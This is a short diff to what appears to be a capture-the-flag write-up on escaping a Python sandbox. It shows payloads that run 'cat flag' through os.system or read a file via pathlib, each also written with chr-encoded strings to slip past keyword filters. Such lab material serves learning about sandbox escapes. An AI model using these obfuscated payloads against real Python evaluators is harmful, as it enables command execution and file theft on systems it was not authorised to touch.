@@ -18,6 +18,12 @@ __import__("os").system("cat flag")
 # encoded:
 __import__(str().join(map(chr, [0x6F, 0x73]))).system(str().join(map(chr, [0x63, 0x61, 0x74, 0x20, 0x66, 0x6C, 0x61, 0x67])))
 ```
+##### Crossplatform (using pathlib):
+```py
+__import__("pathlib").Path("flag").read_text()
+# encoded:
+__import__(str().join(map(chr, [112, 97, 116, 104, 108, 105, 98]))).Path(str().join(map(chr, [102, 108, 97, 103]))).read_text()
+```
 
 ## Trivia
 Without removing `exec` and `eval` you could do:
